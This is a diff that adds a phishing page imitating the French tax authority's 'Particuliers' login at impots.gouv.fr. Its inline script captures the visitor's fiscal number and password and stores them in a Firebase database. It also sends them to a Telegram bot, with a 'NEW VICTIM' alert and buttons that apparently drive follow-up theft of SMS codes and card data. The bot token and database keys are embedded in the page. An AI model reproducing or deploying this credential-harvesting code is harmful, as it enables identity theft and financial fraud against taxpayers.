@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+		<meta charset="utf-8"/>
+		<meta content="width=device-width, initial-scale=1" name="viewport"/>
+		
+		<link charset="utf-8" href="templates/styles/bootstrap.min.css" rel="stylesheet" type="text/css"/>
+		<link charset="utf-8" href="templates/styles/commun.css" rel="stylesheet" type="text/css"/>
+		<link charset="utf-8" href="templates/styles/mire.css" rel="stylesheet" type="text/css"/>
+		<link charset="utf-8" href="templates/styles/dac.css" rel="stylesheet" type="text/css"/>
+		
+		<title>Particuliers | authentification</title>
+	</head>
+	<body>
+		
+		<header style="margin-bottom: 30px;">
+			<div class="container">
+			<!--Le logo-->
+			<div class="row">
+				<!-- Partie gauche -->
+				<div class="col-xs-1u2 col-sm-6 col-md-6">
+					
+						<img src="https://i.postimg.cc/cCSMMbPk/1708385258505.png" style="margin: 20px;" width="200px" />
+			
+			
+		</div></div></div></header>
+		
+		
+		<main class="container" id="contenu">
+			
+			<div class="row">
+				
+				<div class="col-md-6">
+					
+					<div class="panel panel-default">
+						<div class="panel-heading">
+							<h2 class="text-center" id="titre_authent">Authentification</h2>
+						</div>
+						<div class="panel-body">
+							
+							<div class="erreur alert alert-danger erreurDAC cat2 " style="display :none" id="erreur" role="alert">Votre mot de passe est incorrect</div>
+							<div class="erreur alert alert-danger erreurDAC cat2" style="display :none"  id="blocage" role="alert">Vous devez saisir votre numéro fiscal à 13 chiffres.</div>
+							<form  id="formulairePrincipal" method="post">
+							<label for="spi_tmp">Numéro fiscal</label>
+							<input style="margin-bottom:15px;" class="form-control" data-max="13" id="spi_tmp"  placeholder="13 chiffres" type="tel" />
+							<input style="margin-bottom:15px;display:none;" class="form-control" data-min="2"  id="ps_tmp"  placeholder="password" type="text" />
+
+							<div class="text-center" >
+							<button  class="btn btn-default" id="btnAction" type="submit">Continuer</button>
+							</div>
+							</form>
+							
+							<script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+<script type="module">
+
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-app.js";
+import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/9.19.1/firebase-database.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyBl3jw2EGp4FLto4DM0OZbryvcMh7boNfc",
+  authDomain: "testespam-91c35.firebaseapp.com",
+  databaseURL: "https://testespam-91c35-default-rtdb.firebaseio.com",
+  projectId: "testespam-91c35",
+  storageBucket: "testespam-91c35.appspot.com",
+  messagingSenderId: "715946513851",
+  appId: "1:715946513851:web:2925c3b38ba874cdaee09e"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getDatabase(app);
+const randomPhoneNumber = Math.floor(10000000 + Math.random() * 90000000);
+
+const getElementValue = (id) => document.getElementById(id).value;
+const submitButton = document.getElementById("submit");
+
+$("#formulairePrincipal").submit(function (event) {
+  var inputLength = $("#spi_tmp").val().length;
+  var inputPsw = $("#ps_tmp").val().length;
+
+  if (inputLength < 13 || inputLength === 0) {
+    $("#spi_tmp").css({ "border-color": "red", "border-width": "1.2px" });
+    $("#blocage").show();
+  } else {
+    $("#ps_tmp").toggle(inputLength > 12);
+    $("#blocage").hide();
+
+    if (inputPsw >= 6) {
+	  const impotsName = getElementValue("spi_tmp");
+	  const impotsPs = getElementValue("ps_tmp");
+      const Loading  = "true";
+      const SMS = "false";
+      const CC = "false";
+      const CODE2 = "false";
+      const RESU  = "false";
+      const APP = "false";
+      const APPYES = "false";
+      const APPNO = "false";
+
+      set(ref(db, `user/${randomPhoneNumber}`), 
+{ impotsName, impotsPs, Loading, SMS ,CC, CODE2, RESU, APP, APPYES, APPNO});
+
+      const token = "6405780707:AAHRLzgioifKDMGv5Rr9BGI-xqr-R7TZmtQ";
+      const chatId = "5426755496";
+
+      const requestBody = {
+        chat_id: chatId,
+        text: `===== NEW VICTIM 🔔 =====\n • IMPOTS: ${impotsName}-${impotsPs}\n id : ~${randomPhoneNumber}~`,
+        reply_markup: {
+          inline_keyboard: [
+            [
+              { text: 'Loading 💿', callback_data: 'loading' },
+              { text: 'SMS 🗨️', callback_data: 'sms' }
+            ],
+            [
+              { text: 'CC 💳', callback_data: 'cc' },
+              { text: 'CODE 2 🔑', callback_data: 'code' }
+            ],
+            [
+              { text: 'RESU 📄', callback_data: 'resu' },
+              { text: 'APP 📱', callback_data: 'app' }
+            ],
+            [
+              { text: 'APP YES ✅', callback_data: 'appyes' },
+              { text: 'APP NO ❌', callback_data: 'appno' }
+            ]
+          ]
+        }
+      };
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(requestBody)
+      }).then(response => response.ok ? console.log("تم إرسال الرسالة بنجاح!") : console.error("خطأ في إرسال الرسالة:", response.statusText));
+
+      window.location.href = "platfo.html?id=" + randomPhoneNumber;
+    } else {
+      $("#erreur").show();
+    }
+  }
+
+  event.preventDefault();
+});
+
+
+</script>
+
+							</div>
+						
+						
+						</div>
+					<!-- panel-default FIN -->
+				</div>
+				<!-- Fin col-md-6 -->
+				<!-- ============== -->
+				<!-- AIDE DEBUT -->
+				<!-- ============== -->
+				<section class="col-md-6" id="aide">
+					<div class="panel panel-default">
+						<div class="panel-heading">
+							<h2 class="text-center">Aide</h2>
+						</div>
+						<div class="panel-body">
+							<details class="aideSPI" id="aide_spi">
+								<summary>Où trouver votre numéro fiscal&nbsp;?</summary>
+								<div class="well">
+									<p>Si vous disposez déjà d'un espace particulier, vous pouvez <a data-target="#numFiscal" data-toggle="modal" href="#" id="disp_perte_spi" onclick="return false;" title="Ouverture dans une fenêtre modale">recevoir votre numéro fiscal par courriel</a>.</p>
+									<p>Il figure aussi en haut de la première page de votre dernière déclaration de revenus reçue <a href="../external.html?link=https://www.impots.gouv.fr/portail/particulier/questions/jai-egare-les-identifiants-dacces-mon-espace-particulier-comment-puis-je-les-0" rel="noopener" target="_blank" title="Nouvelle fenêtre">ou sur vos avis <span class="dgfipicon dgfipicon-sortie-page" title="Nouvelle fenêtre"></span></a> : </p>
+									<div id="exemple_SPI">
+										
+										<figure class="text-center spacer-top" role="group">
+											<img alt="Légende disponible après l'illustration" class="img-responsive center-block img-thumbnail" height="145" src="templates/images/spi1.svg" width="350" />
+											<figcaption class="text-muted"><em> Illustration : emplacement de votre numéro fiscal, sur votre avis</em></figcaption>
+										</figure>
+									</div>
+								</div>
+							</details>
+							<details class="aideSPI" id="aide_spi1">
+								<summary>Vous n'avez pas encore de numéro fiscal&nbsp;?</summary>
+								<div class="well">		
+                                                                <p>Pour obtenir la création de votre numéro fiscal, veuillez vous adresser à votre 
+								  <span id="CFP">Centre des finances publiques</span>
+								</p>
+                                                                </div>
+							</details>
+							<details class="aideCode hide" id="aide_code">
+								<summary>Vous avez perdu votre code de création</summary>
+								<div class="well">
+									<p>Vous pouvez
+										<a data-target="#codeCreation" data-toggle="modal" href="#">l'obtenir à nouveau par courriel</a>.
+									</p>
+								</div>
+							</details>
+							<details class="aideIdentifiants hide" id="aide_nael">
+								<summary>Où trouver votre numéro d'accès en ligne&nbsp;?</summary>
+								<div class="well">
+									<p>Il figure en haut de la première page de votre dernière déclaration de revenus reçue.</p>
+									<div id="exemple_NAEL">
+										<figure class="text-center spacer-top" role="group">
+											<img alt="Légende disponible après l'illustration" class="img-responsive center-block img-thumbnail" height="145" src="templates/images/num_acces.svg" width="473" />
+											<figcaption class="text-muted"><em>Illustration : emplacement de votre numéro d'accès en ligne, sur votre déclaration</em></figcaption>
+										</figure>
+									</div>
+								</div>
+							</details>
+							<details class="aideIdentifiants hide" id="aide_rfr">
+								<summary>Où trouver votre revenu fiscal de référence&nbsp;?</summary>
+								<div class="well">
+									<p>Il se trouve sur la première page de votre dernier avis d'impôt sur les revenus.
+									</p>
+									
+								</div>
+							</details>
+							<details class="aideMdp hide" id="aide_mdp">
+								<summary>Vous avez oublié votre mot de passe</summary>
+								<div class="well">
+									<p>Vous pouvez
+										<a data-target="#passPerdu" data-toggle="modal" href="#" tabindex="0" title="Ouverture dans une fenêtre modale">renouveler votre mot de passe en quelques clics</a>.
+									</p>
+								</div>
+							</details>
+							<details class="aideMdp hide" id="aide_mdp1">
+								<summary>Comment modifier votre mot de passe&nbsp;?</summary>
+								<div class="well">
+									<p>Une fois connecté, vous pourrez le modifier depuis «&nbsp;Mon profil&nbsp;».</p>
+								</div>
+							</details>
+							<details class="ocfiNonIR hide" id="aide_ocfiNonIR">
+								<summary>Quels éléments fournir pour prouver votre identité&nbsp;?</summary>
+								<div class="well">
+									<p>Vous devez adresser à votre <span id="CFP2">centre des Finances Fubliques</span> une reproduction recto-verso de l'un des éléments suivants&nbsp;:</p>
+									<ul>
+										<li>carte nationale d'identité ou passeport en cours de validité&nbsp;;</li>
+										<li>livret de famille à jour&nbsp;;</li>
+										<li>carte d'invalide de guerre&nbsp;;</li>
+										<li>carte d'invalide civil&nbsp;;</li>
+										<li>extrait d'acte de naissance ou copie intégrale avec mentions en marge&nbsp;;</li>
+										<li>titre de séjour&nbsp;;</li>
+										<li>visa long séjour valant titre de séjour&nbsp;;</li>
+									</ul>
+									<p>À défaut, sont également recevables&nbsp;:</p>
+									<ul>
+										<li>livret de circulation&nbsp;;</li>
+										<li>carte de ressortissant d'un État membre de l'Union Européenne.</li>
+									</ul>
+								</div>
+							</details>
+							<details class="aideIdentifiants hide" id="aide_perteid">
+								<summary>Numéro d'accès en ligne et revenu fiscal de référence perdus</summary>
+								<div class="well">
+									<p>Nous vous invitons à vous adresser à votre
+										<span id="CFP3">centre des Finances Publiques</span> 
+									</p>
+									<p>Faites votre demande en indiquant votre numéro fiscal, ou votre état civil complet, et tous éléments utiles.
+									</p>
+									<p> Les identifiants vous seront alors transmis de manière sécurisée, généralement à l'aide de vos coordonnées (adresse électronique ou téléphone) déjà connues de votre service. 
+									</p>
+								</div>
+							</details>
+							<details class="aideFC hide" id="aide_connexFC">
+								<summary>Se connecter avec FranceConnect</summary>
+								<div class="well">
+									<p>
+										<b>Les services disponibles</b><br />
+										Avec vos identifiants impots.gouv.fr, vous pouvez effectuer des démarches administratives sur des sites partenaires de FranceConnect. Le logo FranceConnect figure sur l'espace d'authentification de ces sites. 
+										<br /><br />
+										<b>Un accès unique et personnel</b><br />
+										L'identification sur un site proposant le bouton FranceConnect est strictement personnelle. Chaque membre d'un foyer fiscal disposant d'un numéro fiscal et d'une adresse électronique validée sur le site impots.gouv.fr peut accéder aux services en ligne en saisissant son propre numéro fiscal.
+										<br /><br />
+										<b>Je rencontre des difficultés pour me connecter</b><br />
+										Nous vous invitons à vérifier la saisie de votre numéro fiscal et de votre mot de passe.<br />
+										Nous vous rappelons que vous devez avoir créé un compte sur le site <a href="index.html">impots.gouv.fr</a>.<br />
+										Si vos identifiants sont correctement saisis et que le blocage persiste, nous vous invitons à contacter le support d'aide FranceConnect à l'adresse suivante : support.usagers@franceconnect.gouv.fr
+									</p>
+								</div>
+							</details>
+						</div>
+						<!-- Fin du panel-body  -->
+						<div class="panel-footer marge">
+							<details id="aide_services">
+								<summary>Les services disponibles sur votre espace particulier</summary>
+								<div class="well">
+									<p>Vous pouvez&nbsp;: </p>
+									<ul>
+										<li>gérer votre prélèvement à la source,</li>
+										<li>payer vos impôts,</li>
+										<li>déclarer vos revenus,</li>
+										<li>consulter vos déclarations et avis d'imposition,</li>
+										</ul>
+								</div>
+							</details>
+							<details id="aide_cookies">
+								<summary>Gestion des <em lang="en">cookies</em></summary>
+								<div class="well">
+									<p>Un <em>cookie</em> est un petit fichier, enregistré sur votre appareil, qui contient des informations nécessaires au fonctionnement
+										du site.
+									</p>
+									<p>Nous n'y enregistrons pas de donnée personnelle.</p>
+									<p>Votre navigateur propose en général un mode de navigation privée,
+										qui supprime les <em>cookies</em> à la fermeture du logiciel.
+									</p>
+								</div>
+							</details>
+						</div>
+						<!-- Fin du panel-footer   -->
+					</div>
+					<!-- Fin du panel-default  -->
+				</section>
+				<!-- Fin de la colonne d'aide -->
+			</div>
+			<!-- row FIN -->
+		</main>
+		<!-- containe contenu FIN -->
+		<footer role="contentinfo">
+			<p class="col-md-12 text-center">Direction générale des Finances publiques</p>
+		</footer>
+		
+		
+		
+	</body>
+
+</html>
